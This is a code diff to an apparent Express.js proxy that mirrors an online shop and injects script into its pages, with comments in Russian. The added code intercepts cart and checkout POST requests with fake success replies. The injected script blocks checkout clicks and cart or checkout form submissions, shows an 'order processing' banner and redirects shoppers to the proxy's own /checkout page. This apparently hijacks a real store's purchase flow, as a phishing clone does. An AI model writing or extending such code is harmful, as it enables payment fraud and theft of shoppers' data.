@@ -59,6 +59,16 @@ app.post('/api/*', (req, res) => {
   res.status(200).json({ success: true });
 });
 
+// Обработка POST запросов к корзине
+app.post('/cart', (req, res) => {
+  console.log('🛒 Cart POST intercepted:', req.url);
+  res.status(200).json({ 
+    success: true, 
+    redirect: '/checkout',
+    message: 'Redirecting to checkout...' 
+  });
+});
+
 app.post('/cart/*', (req, res) => {
   // Если это запрос на добавление в корзину, логируем и перенаправляем
   if (req.url.includes('add') || req.url.includes('update')) {
@@ -71,6 +81,16 @@ app.post('/cart/*', (req, res) => {
   } else {
     res.status(200).json({ success: true });
   }
+});
+
+// Обработка POST запросов к checkout
+app.post('/checkout*', (req, res) => {
+  console.log('🎯 Checkout POST intercepted:', req.url);
+  res.status(200).json({ 
+    success: true, 
+    redirect: '/checkout',
+    message: 'Redirecting to checkout...' 
+  });
 });
 
 app.post('/.well-known/*', (req, res) => {
@@ -130,10 +150,12 @@ const proxyOptions = {
                   const target = event.target;
                   const text = target.textContent?.toLowerCase() || '';
                   const href = target.href || '';
+                  const form = target.closest('form');
                   
                   if (text.includes('checkout') || text.includes('купить') || 
                       text.includes('оформить') || href.includes('checkout') ||
-                      target.classList.contains('checkout') || target.id.includes('checkout')) {
+                      target.classList.contains('checkout') || target.id.includes('checkout') ||
+                      (form && form.action && form.action.includes('cart'))) {
                     console.log('🎯 Checkout button clicked:', target);
                     event.preventDefault();
                     event.stopPropagation();
@@ -156,14 +178,49 @@ const proxyOptions = {
                 });
               }
               
+              // Перехватываем формы
+              function interceptForms() {
+                document.addEventListener('submit', function(event) {
+                  const form = event.target;
+                  const action = form.action?.toLowerCase() || '';
+                  
+                  if (action.includes('cart') || action.includes('checkout')) {
+                    console.log('🎯 Form submission intercepted:', form);
+                    event.preventDefault();
+                    event.stopPropagation();
+                    
+                    const notification = document.createElement('div');
+                    notification.innerHTML = \`
+                      <div style="position:fixed;top:20px;right:20px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;padding:15px 25px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.3);z-index:10000;font-family:Arial,sans-serif;font-weight:bold;">
+                        Обрабатываем заказ...
+                      </div>
+                    \`;
+                    document.body.appendChild(notification);
+                    
+                    setTimeout(() => {
+                      window.location.href = '/checkout';
+                    }, 1000);
+                    
+                    return false;
+                  }
+                });
+              }
+              
               if (document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', interceptCheckoutClicks);
+                document.addEventListener('DOMContentLoaded', function() {
+                  interceptCheckoutClicks();
+                  interceptForms();
+                });
               } else {
                 interceptCheckoutClicks();
+                interceptForms();
               }
               
               // Дополнительная проверка
-              setTimeout(interceptCheckoutClicks, 2000);
+              setTimeout(() => {
+                interceptCheckoutClicks();
+                interceptForms();
+              }, 2000);
             })();
           </script>
         `;
